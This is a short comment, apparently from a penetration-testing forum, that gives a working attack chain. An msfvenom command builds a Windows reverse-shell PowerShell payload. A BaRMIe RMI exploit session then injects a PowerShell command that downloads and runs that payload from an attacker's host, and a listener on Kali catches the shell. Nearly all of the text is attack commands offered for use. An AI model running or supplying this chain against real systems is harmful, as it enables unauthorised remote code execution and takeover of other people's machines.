"This worked for me
msfvenom -p windows/shell_reverse_tcp LHOST=192.xxx.xxx.xxx LPORT=6666 -f psh -o powershellreverse6666.ps1

And in barmie you can do something like below:
========
Select a payload to use (b to back up, q to quit): 1

Enter an OS command to execute: powershell.exe IEX (New-Object System.Net.WebClient).DownloadString(' http://192.xxx.xxx.xxx/powershellreverse6666.ps1')
[~] Starting RMI registry proxy...
======

And then catch shell on kali on 6666 port."
